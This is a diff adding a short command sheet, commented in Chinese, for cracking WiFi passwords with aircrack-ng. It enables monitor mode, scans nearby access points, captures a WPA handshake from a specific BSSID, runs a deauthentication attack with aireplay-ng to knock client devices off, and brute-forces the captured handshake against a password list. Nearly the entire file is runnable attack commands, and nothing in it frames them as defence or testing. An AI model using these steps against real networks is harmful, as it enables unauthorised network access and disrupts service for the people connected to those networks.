@@ -1,0 +1,29 @@
+sudo apt update
+sudo apt install aircrack-ng
+
+检查网卡是否支持监听功能
+sudo airmon-ng
+
+开启监听模式
+sudo airmon-ng start wlan0
+
+扫描当前周边环境的WiFi信号并将结果写入文件myscan
+sudo airodump-ng -w myscan wlan0
+
+# 查看所有扫描到的 AP（跳过前几行注释）
+tail -n +6 myscan-01.csv | head -n -1 | awk -F',' '{print $1, $14}' | grep -v BSSID
+
+抓包
+sudo airodump-ng -c 44 --bssid D8:4A:2B:82:DF:99 -w ./handshake wlan0
+
+ACK 死亡攻击
+sudo aireplay-ng -0 10 -a WiFimac地址 -c 目标设备MAC地址 wlan0
+sudo aireplay-ng -0 10 -a WiFimac地址 -c 目标设备MAC地址 wlan0
+
+暴力破解
+sudo aircrack-ng -w ./password.txt -b WiFimac地址 ./handshake-0*.cap
+
+
+
+
+
